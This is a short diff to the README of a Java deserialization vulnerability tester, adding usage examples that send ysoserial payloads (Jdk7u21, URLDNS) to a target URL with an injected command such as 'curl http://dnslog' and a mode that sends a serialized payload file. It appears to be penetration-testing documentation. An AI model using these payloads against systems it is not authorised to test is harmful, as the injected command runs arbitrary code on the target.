@@ -23,6 +23,11 @@ optional arguments:
                         1、ser：poc以读取序列化文件数据形式发送；2、cmdl：命令行模式，命令行发送序列化poc。默认为命令行模式
   -f FILEPATH, --filepath FILEPATH
                         Serialize Payload File Path: /User/xxxx/Desktop/xxx.ser
+                        
+  Example：
+  1: python3 SerializeVulTest.py -u "http://ip:port/route" -j ysoserial.jar -g Jdk7u21 -c "curl http://dnslog"
+  2: python3 SerializeVulTest.py -u "http://ip:port/route" -j ysoserial.jar -g URLDNS -c http://dnslog
+  3: python3 SerializeVulTest.py -m ser -u "http://ip:port/route" -f ./test.ser
 ``` 
   
 2021-08-26-14:54更新  
